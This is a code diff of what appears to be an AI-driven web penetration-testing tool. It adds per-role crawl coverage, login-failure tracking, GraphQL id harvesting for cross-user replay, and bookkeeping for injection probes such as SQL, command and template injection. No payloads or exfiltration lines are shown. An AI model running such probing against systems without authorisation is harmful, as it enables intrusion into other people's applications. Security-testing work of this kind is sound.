+  return signOutChrome || identityApi;
+}
+
 /** Persist one observation to screens (auto-enrolls it as queued in the coverage ledger) and update the frontier. */
 function recordObservation(s: PilotSession, o: Observation): { screen: Screen; isNew: boolean } {
   const authState = s.currentRole ? "post-login" : "unauth";
@@ -1065,18 +1451,57 @@ function recordObservation(s: PilotSession, o: Observation): { screen: Screen; i
   const here = stripHash(o.finalUrl);
   s.visited.add(here);
   s.frontier.delete(here);
+  const who = activeRoleKey(s);
+  // Per-role navigation tracking: the active role's own dedupe set (frontier/enrol/probe candidates), so
+  // role B is still OFFERED URLs A already walked while neither re-offers a URL that session already saw.
+  const nav = roleNavigated(s);
+  const firstSeen = !nav.has(here);
+  nav.add(here);
+  // Per-role survey progress: role A's visited set must not satisfy role B's surface. Track who observed what —
+  // and persist it through survey_role_progress so a resume restores honest per-role coverage instead of a
+  // blank slate (or worse, one role's cookie satisfying them all). For a NAMED role a visit only counts when
+  // the observation proves the session reached authenticated surface — a public page under a valid cookie, an
+  // HTTP error, or a login page never counts; session-death signals record the role blocked instead of letting
+  // survey_done refuse forever.
+  let counted = false;
+  if (s.visitedByRole) {
+    if (who === "unauth" || sessionBoundEvidence(s, o)) {
+      const qualifies = who === "unauth" ? o.status < 400 && !looksLikeErrorCatchAll(o) && !looksLikeLogin(o.visibleText) : true;
+      if (qualifies) {
+        if (!s.visitedByRole.has(who)) s.visitedByRole.set(who, new Set());
+        const set = s.visitedByRole.get(who)!;
+        const before = set.size;
+        set.add(here);
+        if (set.size > before) {
+          s.roleSurveyCounts?.set(who, set.size);
+          counted = true;
+        }
+      }
+    } else if (o.status === 401) {
+      markRoleSurveyBlocked(s, who, `session rejected — HTTP 401 on ${o.finalUrl.slice(0, 120)} (expired/unauthenticated)`);
+    } else if (looksLikeErrorCatchAll(o) || looksLikeLogin(o.visibleText)) {
+      markRoleSurveyBlocked(s, who, `session bounced to a login/error page (${o.finalUrl.slice(0, 120)}) — expired or unauthenticated`);
+    }
+  }
   // Exploration cap (--max-survey-screens): on reaching it, empty the frontier and add no further discovered links
   //   (map no more → survey_status's frontier goes empty and the model calls survey_done).
   if (s.maxSurveyScreens != null && s.inv.screens().length >= s.maxSurveyScreens) {
     if (!s.surveyCapped) {
       s.surveyCapped = true;
       s.frontier.clear();
+      for (const set of s.frontierByRole?.values() ?? []) set.clear(); // cap applies to every role's pending
       s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🧭 survey cap reached (${s.maxSurveyScreens} screens) — stopping exploration; remaining links not followed` } });
     }
   } else {
     // The screen + its APIs are already recorded (the ingest above). Under a hard lock, add no discovered links (frontierLinks returns []).
     for (const abs of frontierLinks(o, s)) s.frontier.add(abs);
   }
+  // Persist AFTER frontier seeding so the snapshot carries the pending links this page discovered — a pause
+  // right after this visit still restores them on resume. Emitted on a counted visit or a first-seen URL
+  // (which is also when pending/gated change), keeping event volume bounded to real navigation. A role that
+  // is currently BLOCKED keeps that state — a public-page visit must not resurrect it on restore.
+  if (counted || firstSeen)
+    emitRoleProgress(s, who, s.roleSurveyBlocked?.has(who) ? "blocked" : "mapped", s.roleSurveyBlocked?.get(who));
   return { screen, isNew };
 }
 
@@ -1152,10 +1577,11 @@ async function runInputSweep(s: PilotSession, screen: Screen, isNew: boolean): P
       allow: (u) => isInScope(u, s.scope) && !isSessionDestroyingPath(u),
     });
     let added = 0;
+    const seen = roleNavigated(s);
     for (const d of sweep.discovered) {
       const abs = stripHash(d);
       if (!isInScope(abs, s.scope) || isSessionDestroyingPath(abs)) continue;
-      if (s.visited.has(abs) || s.frontier.has(abs) || s.refererGated.has(abs)) continue;
+      if (seen.has(abs) || s.frontier.has(abs) || s.refererGated.has(abs)) continue;
       if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue;
       s.frontier.add(abs);
       added += 1;
@@ -1249,11 +1675,16 @@ export async function enrolByNavigate(
 ): Promise<{ outcome: EnrolOutcome; screenId?: string; status?: number; finalUrl?: string }> {
   if (!isInScope(url, s.scope) || isSessionDestroyingPath(url)) return { outcome: "out_of_scope" };
   const key = stripHash(url);
-  if (s.visited.has(key) || s.refererGated.has(key)) return { outcome: "duplicate" };
+  const nav = roleNavigated(s);
+  if (nav.has(key) || s.refererGated.has(key)) return { outcome: "duplicate" };
   const o = await s.driver.visit(url);
   s.visited.add(key); // probed — never retry, whatever the result
-  if (o.status >= 400) return { outcome: "not_found", status: o.status, finalUrl: o.finalUrl };
-  if (looksLikeErrorCatchAll(o)) return { outcome: "bounced", status: o.status, finalUrl: o.finalUrl }; // 404 page / login-bounce = not real
+  nav.add(key);
+  if (o.status >= 400 || looksLikeErrorCatchAll(o)) {
+    const who = activeRoleKey(s);
+    emitRoleProgress(s, who, s.roleSurveyBlocked?.has(who) ? "blocked" : "mapped", s.roleSurveyBlocked?.get(who));
+    return { outcome: o.status >= 400 ? "not_found" : "bounced", status: o.status, finalUrl: o.finalUrl }; // 404 page / login-bounce = not real
+  }
   const { screen, isNew } = recordObservation(s, o);
   await captureScreenshot(s, screen);
   return { outcome: isNew ? "enrolled" : "duplicate", screenId: screen.screenId, status: o.status, finalUrl: o.finalUrl };
@@ -1267,7 +1698,7 @@ export async function backfillParentPrefixes(s: PilotSession): Promise<{ probed:
   if (s.lockToSeeds) return { probed: 0, enrolled: 0 }; // URL-list lock: map only the seeds, no exploration
   const CAP = 40;
   const candidates = deriveParentPrefixes(s.inv.screens(), { targetUrl: s.targetUrl, ignorePaths: s.ignorePaths }).filter(
-    (u) => !s.visited.has(stripHash(u)) && !s.refererGated.has(stripHash(u)),
+    (u) => !roleNavigated(s).has(stripHash(u)) && !s.refererGated.has(stripHash(u)),
   );
   const list = candidates.slice(0, CAP);
   let probed = 0;
@@ -1335,6 +1766,14 @@ function knownObjectIds(s: PilotSession): string[] {
       const seg = u.split("?")[0]?.split("/").filter(Boolean).pop() ?? "";
       if (/[a-z]*\d{2,}|^[0-9a-f-]{6,}$/i.test(seg)) out.add(seg);
     }
+    // GraphQL operations carry real object ids in their observed variables (variables.input.ownerId etc.) —
+    // mine them by leaf name so cross-user replays can aim at ids the app actually used.
+    for (const a of sc.apis) {
+      if (!a.graphql?.variablesExample) continue;
+      for (const leaf of graphqlIdLeafPaths(a.graphql.variablesExample)) {
+        if (leaf.example && leaf.example !== "<redacted>") out.add(`${leaf.name}=${leaf.example}`);
+      }
+    }
   }
   harvestBodyIds(s.evidence.records, out);
   return [...out].slice(0, 40);
@@ -1348,7 +1787,23 @@ function screenDigest(sc: Screen): Record<string, unknown> {
     screenType: sc.screenType,
     labels: sc.labels,
     params: sc.params.map((p) => ({ name: p.name, in: p.in, type: p.guessedType })),
-    apis: sc.apis.map((a) => ({ method: a.method, urlTemplate: a.urlTemplate })),
+    apis: sc.apis.map((a) => ({
+      method: a.method,
+      urlTemplate: a.urlTemplate,
+      // GraphQL: the op identity the model can drive with probe_graphql_op (operationName/key + root fields +
+      // variable names). One endpoint's distinct operations stay distinguishable here.
+      ...(a.graphql
+        ? {
+            graphql: {
+              operationName: a.graphql.operationName,
+              operationKey: a.graphql.operationKey,
+              operationType: a.graphql.operationType,
+              rootFields: a.graphql.rootFields,
+              variables: Object.keys(a.graphql.variablesShape),
+            },
+          }
+        : {}),
+    })),
   };
 }
 
@@ -1364,7 +1819,7 @@ function screenBrief(sc: Screen): Record<string, unknown> {
     auth: sc.authState,
     labels: sc.labels,
     params: sc.params.map((p) => p.name).join(",") || undefined,
-    apis: sc.apis.slice(0, 12).map((a) => `${a.method} ${a.urlTemplate}`),
+    apis: sc.apis.slice(0, 12).map((a) => (a.graphql ? `${a.method} ${a.urlTemplate} ▸ ${a.graphql.operationName ?? a.graphql.operationKey}` : `${a.method} ${a.urlTemplate}`)),
     ...(sc.apis.length > 12 ? { apisMore: sc.apis.length - 12 } : {}),
   };
 }
@@ -1389,7 +1844,7 @@ async function probeTiming(s: PilotSession, build: (value: string) => HttpReques
     const response = await s.http.send(request);
     bumpHttp(s, response.status);
     return s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator, kind,
-      request: { ...request, headers: s.http.effectiveHeaders(request.headers) }, response,
+      request: { ...request, headers: s.http.effectiveHeaders(request.headers, request.inheritDefaultHeaders !== false) }, response,
       note: `time experiment ${kind}`, ...(timingProof ? { timingProof } : {}) });
   };
   const usable = (r: Awaited<ReturnType<typeof send>>) => r && !r.response.truncated && !looksBlocked(r.response) && r.response.status >= 200 && r.response.status < 300;
@@ -1540,8 +1995,57 @@ export async function analyzePageJs(s: PilotSession, pageUrl: string): Promise<A
   return { page: pageUrl, analyzed: perBundle.length, endpointsEnrolled: totalEnrolled, secretsFound: totalSecrets, sinkCandidates: totalSinks, sinkLeads: sinkLeads.slice(0, leadsShown), bundles: perBundle };
 }
 
+/** Probe tool → ledger check class (generic instrumentation). A function lets a multi-purpose probe
+ *  attribute the class it actually exercised (the model's declaration is recorded verbatim — the row
+ *  still names the tool, so a mislabel is auditable; it can never forge a FINDING, only which plan
+ *  slot its execution satisfies). Tools not listed write no row via this path. */
+const GENERIC_PROBE_CLASS: Record<string, string | ((a: Record<string, unknown>) => string)> = {
+  probe_xss: "xss-reflected",
+  probe_dom_xss: "xss-reflected",
+  probe_stored_xss: "xss-stored",
+  probe_ssti: "ssti",
+  probe_sqli: "sqli",
+  probe_nosql: "nosql",
+  probe_cmdi: "rce",
+  probe_traversal: "path-traversal",
+  probe_redirect: "open-redirect",
+  probe_cors: "cors-misconfig",
+  probe_proto: "prototype-pollution",
+  probe_jwt: "session",
+  probe_csrf: "csrf",
+  probe_ssrf: "ssrf",
+  probe_upload: "upload",
+  probe_race: "race-condition",
+  probe_reset_poison: "account-takeover",
+  probe_user_enum: "user-enumeration",
+  probe_secrets: "secret-exposure",
+  probe_headers: "headers",
+  analyze_session: "session",
+  probe_params: "recon",
+  http_request: "http-request",
+  probe_graphql: "info-disclosure",
+  probe_oob: (a) => (typeof a.checkClass === "string" ? a.checkClass : "oob"),
+  probe_logic: (a) => (typeof a.checkClass === "string" ? a.checkClass : "logic"),
+  probe_scenario: (a) => (typeof a.checkClass === "string" ? a.checkClass : "logic"),
+};
+
+/** Best-effort request surface for generic instrumentation — each probe shape differs; we take the
+ *  first URL-bearing field the probe actually sends (url / baseline.url / mutated.url / store.url /
+ *  renderUrl). Used only for the ledger row's target + origin. */
+function probeArgsUrl(args: Record<string, unknown>): string | undefined {
+  const pick = (v: unknown): string | undefined => (typeof v === "string" && /^https?:\/\//i.test(v) ? v : undefined);
+  const obj = (k: string) => (args[k] && typeof args[k] === "object" ? (args[k] as Record<string, unknown>) : undefined);
+  return pick(args.url) ?? pick(obj("baseline")?.url) ?? pick(obj("mutated")?.url) ?? pick(obj("store")?.url) ?? pick(args.renderUrl) ?? pick(obj("request")?.url);
+}
+
+function probeArgsMethod(args: Record<string, unknown>): string {
+  const obj = (k: string) => (args[k] && typeof args[k] === "object" ? (args[k] as Record<string, unknown>) : undefined);
+  const m = args.method ?? obj("baseline")?.method ?? obj("mutated")?.method ?? obj("store")?.method ?? obj("request")?.method;
+  return typeof m === "string" ? m.toUpperCase() : args.body || obj("baseline")?.body ? "POST" : "GET";
+}
+
 export function buildTools(s: PilotSession) {
-  return [
+  const defs = [
     // ───────────────────────── survey (STAGE 1) ─────────────────────────
     tool(
       "browser_navigate",
@@ -1558,6 +2062,11 @@ export function buildTools(s: PilotSession) {
           //   page, do NOT enroll it as a screen and do NOT seed its links to the frontier (that derails the crawl onto
           //   the error page). Flag the route referer-gated so it's reached by an in-app browser_click instead.
           if (looksLikeErrorCatchAll(o)) {
+            // A role session that bounced to a LOGIN page is expired/unauthenticated — record it blocked with a
+            // concrete reason (bounded survey completion) instead of letting survey_done refuse forever. A generic
+            // error catch-all without login content is a routing failure, not a session verdict.
+            if (s.currentRole && looksLikeLogin(o.visibleText))
+              markRoleSurveyBlocked(s, s.currentRole, `session bounced to a login page (${o.finalUrl.slice(0, 120)}) — expired or unauthenticated`);
             // Anchor auto-recovery (opt-in via --anchor-url): the cold GET bounced, but the route may be reachable by
             // clicking its link from the goto-safe anchor hub. With no anchor set this whole block is skipped = unchanged.
             if (s.anchorUrl) {
@@ -1581,6 +2090,10 @@ export function buildTools(s: PilotSession) {
             }
             s.refererGated.add(stripHash(url));
             s.frontier.delete(stripHash(url));
+            // Gated state changed without an observation — persist it so resume keeps the gate (per-role).
+            const who = activeRoleKey(s);
+            roleNavigated(s).add(stripHash(url));
+            emitRoleProgress(s, who, s.roleSurveyBlocked?.has(who) ? "blocked" : "mapped", s.roleSurveyBlocked?.get(who));
             s.store.appendEvent(s.assessmentId, {
               type: "note",
               payload: { message: `🚧 ${url} bounced to an error/login page (${o.finalUrl}) — referer-gated, not enrolled. Reach it via browser_click from a page that links to it.` },
@@ -1710,14 +2223,24 @@ export function buildTools(s: PilotSession) {
       {},
       async () => {
         const screens = s.inv.screens();
+        const roles = availableRoles(s);
         return txt(
           JSON.stringify({
             currentRole: s.currentRole || "unauth",
-            rolesAvailable: availableRoles(s),
+            rolesAvailable: roles,
+            ...(roles.length
+              ? {
+                  rolesMapped: roles
+                    .map((r) => `${r.name}(${Math.max(s.visitedByRole?.get(r.name)?.size ?? 0, s.roleSurveyCounts?.get(r.name) ?? 0)})`)
+                    .filter((x) => !x.endsWith("(0)")),
+                  rolesBlocked: [...(s.roleSurveyBlocked?.entries() ?? [])].map(([r, w]) => `${r}: ${w}`),
+                }
+              : {}),
             screensDiscovered: screens.length,
             screensSample: screens.map((sc) => `${sc.authState === "post-login" ? "🔒" : ""}${sc.urlTemplate}`).slice(0, 40),
             visited: s.visited.size,
-            frontierRemaining: s.frontier.size,
+            frontierRemaining: unionFrontier(s).size,
+            frontierRemainingThisRole: s.frontier.size,
             frontier: [...s.frontier].slice(0, 40),
             ignoring: s.ignorePaths,
             exhaustive: s.exhaustive,
@@ -1736,17 +2259,21 @@ export function buildTools(s: PilotSession) {
           return txt("exhaustive mode: ignore is disabled — mapping the full surface. (run without --exhaustive to allow dynamic pruning.)");
         for (const p of patterns) if (p.trim()) s.ignorePaths.push(p.trim());
         let pruned = 0;
-        for (const u of [...s.frontier]) {
-          if (pathIsIgnored(u, s.ignorePaths, s.targetUrl)) {
-            s.frontier.delete(u);
-            pruned += 1;
+        // The operator ignored these paths globally — prune EVERY role's pending frontier, not just the active one.
+        const allFrontiers = new Set<Set<string>>([s.frontier, ...(s.frontierByRole?.values() ?? [])]);
+        for (const set of allFrontiers) {
+          for (const u of [...set]) {
+            if (pathIsIgnored(u, s.ignorePaths, s.targetUrl)) {
+              set.delete(u);
+              pruned += 1;
+            }
           }
         }
         s.store.appendEvent(s.assessmentId, {
           type: "note",
-          payload: { message: `🗑 ignore_paths +[${patterns.join(", ")}]: ${reason.slice(0, 120)} — frontier -${pruned} → ${s.frontier.size}` },
+          payload: { message: `🗑 ignore_paths +[${patterns.join(", ")}]: ${reason.slice(0, 120)} — frontier -${pruned} → ${unionFrontier(s).size}` },
         });
-        return txt(JSON.stringify({ ignoring: s.ignorePaths, prunedFromFrontier: pruned, frontierRemaining: s.frontier.size }));
+        return txt(JSON.stringify({ ignoring: s.ignorePaths, prunedFromFrontier: pruned, frontierRemaining: unionFrontier(s).size }));
       },
     ),
     tool(
@@ -1754,27 +2281,46 @@ export function buildTools(s: PilotSession) {
       "Finish the SURVEY stage once the frontier is empty and every role's authenticated surface is mapped. Provide a one-line coverage summary.",
       { summary: z.string() },
       async ({ summary }) => {
-        if (s.frontier.size > 0 && !s.surveyCapped) {
-          return txt(`survey_done REFUSED — ${s.frontier.size} in-scope URL(s) remain unvisited. Continue mapping the frontier reported by survey_status before completing.`);
+        const pendingAll = unionFrontier(s);
+        if (pendingAll.size > 0 && !s.surveyCapped) {
+          const perRole = [...(s.frontierByRole?.entries() ?? [])].filter(([, set]) => set.size > 0).map(([r, set]) => `${r}(${set.size})`).join(", ");
+          return txt(`survey_done REFUSED — ${pendingAll.size} in-scope URL(s) remain unvisited${perRole ? ` (${perRole})` : ""}. Continue mapping the frontier reported by survey_status before completing.`);
         }
-        // Structural auth gate: if roles are configured but no authenticated session was ever established
-        // (both currentCookie and Bearer empty), the entire post-login surface is unmapped = an anonymous survey.
-        // Refuse survey_done here and require login() per role before completing (same "structurally prevent
-        // eliding work" philosophy as evidence discipline / screen_done's coverage gate). Even the attended primary
-        // is treated as unauthenticated until the manual login actually yields a cookie (currentRole being set isn't enough).
+        // Structural auth gate, PER-ROLE: every configured role must have actually navigated at least one URL
+        // under ITS OWN session (visitedByRole), or carry an explicit block reason recorded when its login failed
+        // (roleSurveyBlocked). One role's cookie must not silently satisfy an all-role exploration, and a blocked
+        // role stays visible instead of converting to "covered". Unmapped roles refuse the close.
         const roles = availableRoles(s);
-        const authActive = !!(s.currentCookie || s.currentBearer);
-        if (!surveyAuthGate(roles.length, authActive).ok) {
-          const names = roles.map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ");
-          s.store.appendEvent(s.assessmentId, {
-            type: "note",
-            payload: { message: `⛔ survey_done refused — ${roles.length} role(s) configured but no authenticated session active; post-login surface unmapped` },
-          });
-          return txt(
-            `survey_done REFUSED — ${roles.length} role(s) are configured (${names}) but no authenticated session is active, so the entire post-login surface is unmapped (this is how a run silently drops from ~60 to ~30 screens). ` +
-              `For EACH role: call login(role) — in attended mode this switches to the operator's live session; verify the response shows a cookie/bearer is present — then browser_navigate the authenticated pages it unlocks so they enter the inventory. ` +
-              `Only call survey_done again once each role's authenticated surface is mapped. (If a target genuinely has no auth, no roles would be configured and this gate would not apply.)`,
-          );
+        if (roles.length > 0) {
+          const unmapped: string[] = [];
+          const blocked: string[] = [];
+          const mapped: string[] = [];
+          for (const r of roles) {
+            const seen = Math.max(s.visitedByRole?.get(r.name)?.size ?? 0, s.roleSurveyCounts?.get(r.name) ?? 0);
+            const block = s.roleSurveyBlocked?.get(r.name);
+            if (seen > 0) mapped.push(`${r.name}(${seen})`);
+            else if (block) blocked.push(`${r.name}: ${block}`);
+            else unmapped.push(r.name);
+          }
+          if (unmapped.length > 0) {
+            const names = unmapped.join(", ");
+            s.store.appendEvent(s.assessmentId, {
+              type: "note",
+              payload: { message: `⛔ survey_done refused — role(s) not yet mapped under their own session: ${names}` },
+            });
+            return txt(
+              `survey_done REFUSED — configured role(s) ${names} have not visited ANY url under their own session, so their authenticated surface is unmapped (this is how a run silently drops from ~60 to ~30 screens). ` +
+                `For EACH such role: call login(role) — in attended mode this switches to the operator's live session; verify a cookie/bearer is present — then browser_navigate the authenticated pages it unlocks so they enter the inventory. ` +
+                `If a role genuinely cannot authenticate, a failed login() records it as blocked and this gate lets it pass with that reason on record. ` +
+                `Only call survey_done again once each role's authenticated surface is mapped or explicitly blocked. (Mapped: ${mapped.join(", ") || "none"}${blocked.length ? `; blocked: ${blocked.join("; ")}` : ""})`,
+            );
+          }
+          if (blocked.length > 0) {
+            s.store.appendEvent(s.assessmentId, {
+              type: "note",
+              payload: { message: `⚠️ survey completing with ${blocked.length} role(s) BLOCKED (not covered): ${blocked.join("; ")}` },
+            });
+          }
         }
         s.surveyDone = true;
         s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🗺  SURVEY done: ${summary.slice(0, 300)}` } });
@@ -1817,6 +2363,7 @@ export function buildTools(s: PilotSession) {
         for (const { screenId, vulnClasses, plan } of plans) {
           s.store.appendEvent(s.assessmentId, { type: "methodology_recorded", payload: { screenId, vulnClasses, plan } });
           s.plans.set(screenId, `classes=[${vulnClasses.join(",")}] ${plan}`);
+          writePlanSlots(s, screenId, vulnClasses); // persist the bounded per-(target,param) check slots
         }
         return txt(`planned ${plans.length} screens (${s.plans.size}/${ids.size} screens planned)`);
       },
@@ -1834,9 +2381,10 @@ export function buildTools(s: PilotSession) {
         }
         s.store.appendEvent(s.assessmentId, { type: "methodology_recorded", payload: { screenId, vulnClasses, plan } });
         s.plans.set(screenId, `classes=[${vulnClasses.join(",")}] ${plan}`);
+        const slots = writePlanSlots(s, screenId, vulnClasses); // persist the bounded per-(target,param) check slots
         s.store.appendEvent(s.assessmentId, {
           type: "note",
-          payload: { message: `📋 PLAN ${screenId}: [${vulnClasses.join(",")}] ${plan.slice(0, 200)}` },
+          payload: { message: `📋 PLAN ${screenId}: [${vulnClasses.join(",")}] ${plan.slice(0, 200)}${slots ? ` — ${slots} check slot(s)` : ""}` },
         });
         return txt(`planned ${screenId} (${s.plans.size}/${s.inv.screens().length} screens planned)`);
       },
@@ -1938,7 +2486,7 @@ export function buildTools(s: PilotSession) {
           screenId: s.currentScreenId ?? "pilot",
           validator: "claude-pilot",
           kind: kind ?? "positive_replay",
-          request: { ...req, headers: s.http.effectiveHeaders(req.headers), body: evBody }, // keep all sent headers as evidence
+          request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false), body: evBody }, // keep all sent headers as evidence
           response: res,
           note: note ?? `${req.method} ${url} as ${s.currentRole || "unauth"}`,
         });
@@ -1975,6 +2523,13 @@ export function buildTools(s: PilotSession) {
         const tag = desc ? ` [${desc}]` : ""; // attach the privilege description (if any) to the response
         // ⓪ attended (manual multi-session): each role already has a live context.
         //    Don't re-login; just swap the active driver / cookie to that role.
+        const markBlocked = (why: string) => markRoleSurveyBlocked(s, role, why);
+        const markAuthed = async (): Promise<void> => {
+          const hadBlock = s.roleSurveyBlocked?.has(role);
+          s.roleSurveyBlocked?.delete(role);
+          if (hadBlock) emitRoleProgress(s, role, "mapped");
+          await establishPrincipal(s, role); // whoami-style identity binding when an identityUrl was configured
+        };
         const live = s.roleSessions?.get(role);
         if (live) {
           s.driver = live.driver;
@@ -1982,7 +2537,14 @@ export function buildTools(s: PilotSession) {
           if (fresh) live.cookie = fresh;
           s.currentCookie = live.cookie;
           s.currentBearer = (await live.driver.bearerToken().catch(() => null)) ?? "";
-          s.currentRole = role;
+          setActiveRole(s, role); // swap frontier/gated to this role's own sets before any navigation
+          await markAuthed();
+          // An attended session carrying no material cannot authenticate — record it blocked up front
+          // (a later real login clears it) instead of letting its public-page visits count as role mapping.
+          if (!live.cookie && !s.currentBearer) {
+            markBlocked(`attended session for '${role}' carries no session material (empty cookie, no bearer)`);
+            return txt(`switched to live attended session for role '${role}'${tag} — WARNING: the session has no cookie/bearer, its visits will NOT count as authenticated mapping and the role is recorded BLOCKED until a real session is established.`);
+          }
           return txt(`switched to live attended session for role '${role}'${tag} (manual login; cookie ${live.cookie ? "present" : "empty"}${s.currentBearer ? ", bearer present" : ""}).`);
         }
         // ① If there's a pre-captured Cookie file, inject it without logging in (for walls that can't be auto-logged-in).
@@ -1991,13 +2553,15 @@ export function buildTools(s: PilotSession) {
           try {
             const loaded = loadCookieFile(cookieFile, s.targetUrl);
             if (!loaded.header && !loaded.bearer && loaded.origins.length === 0) {
+              markBlocked(`cookie file empty/unparseable: ${cookieFile}`);
               return txt(`cookie file for '${role}' is empty/unparseable: ${cookieFile}`);
             }
             await s.driver.clearSession();
             const applied = await applyLoadedAuth(s.driver, loaded, s.targetUrl);
             s.currentCookie = applied.cookie;
             s.currentBearer = applied.bearer;
-            s.currentRole = role;
+            setActiveRole(s, role);
+            await markAuthed();
             const bits = [
               loaded.browserCookies.length ? `${loaded.browserCookies.length} cookie(s)` : "",
               loaded.origins.length ? `${loaded.origins.reduce((n, o) => n + o.localStorage.length, 0)} localStorage key(s)` : "",
@@ -2005,12 +2569,14 @@ export function buildTools(s: PilotSession) {
             ].filter(Boolean);
             return txt(`role '${role}'${tag}: injected ${bits.join(", ") || "session"} from file (no login).`);
           } catch (e) {
+            markBlocked(`cookie file error: ${String(e).slice(0, 150)}`);
             return txt(`cookie file error for '${role}': ${String(e).slice(0, 150)}`);
           }
         }
         // ② smartLogin with credentials.
         const creds = s.roleCreds.get(role);
         if (!creds) {
+          markBlocked("no credentials or cookie file configured for this role");
           const avail = availableRoles(s).map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ") || "none";
           return txt(`no credentials/cookie for '${role}'. Available roles: ${avail}`);
         }
@@ -2024,11 +2590,14 @@ export function buildTools(s: PilotSession) {
           if (r.ok) {
             s.currentCookie = await s.driver.sessionCookieHeader();
             s.currentBearer = (await s.driver.bearerToken().catch(() => null)) ?? "";
-            s.currentRole = role;
+            setActiveRole(s, role);
+            await markAuthed();
             return txt(`logged in as '${role}'${tag}; now at ${s.driver.currentUrl()}${s.currentBearer ? " (bearer JWT captured)" : ""}`);
           }
+          markBlocked(`login did not complete: ${r.reason}`);
           return txt(`login as '${role}' did not complete: ${r.reason}`);
         } catch (e) {
+          markBlocked(`login error: ${String(e).slice(0, 150)}`);
           return txt(`login error: ${String(e).slice(0, 200)}`);
         }
       },
@@ -2066,7 +2635,7 @@ export function buildTools(s: PilotSession) {
           const req = buildReq(val)!;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-xss", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `xss ${tag}` });
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-xss", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `xss ${tag}` });
           return { evId: ev.id, status: res.status, body: res.body };
         };
         // Each payload's marker = a deterministic substring (real <>/handler) that appears in the response only when it survives unescaped.
@@ -2189,7 +2758,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-cmdi",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `cmdi ${tag}`,
           });
@@ -2267,7 +2836,7 @@ export function buildTools(s: PilotSession) {
           const req = buildReq(val)!;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-traversal", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `traversal ${tag}` });
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-traversal", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `traversal ${tag}` });
           return { evId: ev.id, status: res.status, body: res.body };
         };
         const corpus = [
@@ -2438,12 +3007,12 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-ssti",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `ssti ${tag} ${param ?? "body"}`,
           });
           // hasMarker = whether the evaluation result (the product) appears in the response. False if only the payload literal is returned.
-          return { evId: ev.id, status: res.status, evaluated: res.body.includes(product), echoedLiteral: res.body.includes(payload) };
+          return { evId: ev.id, status: res.status, headers: res.headers, body: res.body, evaluated: res.body.includes(product), echoedLiteral: res.body.includes(payload) };
         };
         let ctrl: Awaited<ReturnType<typeof send>>;
         let p1: Awaited<ReturnType<typeof send>>;
@@ -2460,8 +3029,19 @@ export function buildTools(s: PilotSession) {
           { status: ctrl.status, hasMarker: ctrl.evaluated },
           [p1, p2].map((p) => ({ status: p.status, hasMarker: p.evaluated })),
         );
+        // Structured ledger contract: the benign control leg IS the baseline — a rejected control
+        // (4xx/5xx or an auth-wall redirect) means the endpoint never evaluated anything, so a
+        // negative on it is unverifiable, not clean. The same holds per payload leg: a 500/4xx
+        // response or a 302→login bounce never reached the app, so its "no evaluation" is silence,
+        // not evidence — the negative stays unverified.
+        const baselineOk = validAppBaseline(ctrl);
+        const payloadsReached = [p1, p2].every(validAppBaseline);
+        const outcome = verdict.ok ? "confirmed" : baselineOk && payloadsReached ? "clean" : "unverified";
         return txt(
           JSON.stringify({
+            result: outcome,
+            baselineEvidenceId: ctrl.evId,
+            evidenceIds: [ctrl.evId, p1.evId, p2.evId],
             negativeControl: ctrl.evId,
             positiveReplays: [p1.evId, p2.evId],
             effectMarker: product,
@@ -2510,24 +3090,35 @@ export function buildTools(s: PilotSession) {
           if (!isInScope(req.url, s.scope)) return null;
           return req;
         };
+        const sentEvIds: string[] = [];
+        // A leg whose payload was never evaluated (5xx, proxy challenge, auth refusal, login
+        // redirect, an invalid-input 400/422, or a 200 login/proxy body) is silence, not a
+        // negative — ANY such leg keeps the whole result unverified.
+        let invalidLegs = 0;
         const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
           const req = buildReq(val);
           if (!req) return null;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
+          if (!legEvaluatedInput(res)) invalidLegs++;
           const ev = s.evidence.record({
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-sqli",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `sqli ${tag}`,
           });
-          return { evId: ev.id, status: res.status, len: res.body.length, nlen: normalizeVolatile(res.body).length, ms: res.durationMs, body: res.body };
+          sentEvIds.push(ev.id);
+          return { evId: ev.id, status: res.status, headers: res.headers, len: res.body.length, nlen: normalizeVolatile(res.body).length, ms: res.durationMs, body: res.body };
         };
         try {
           const benign = await send("1", "negative_control", "baseline(benign)");
           if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{SQLI}}.");
+          if (!validAppBaseline(benign))
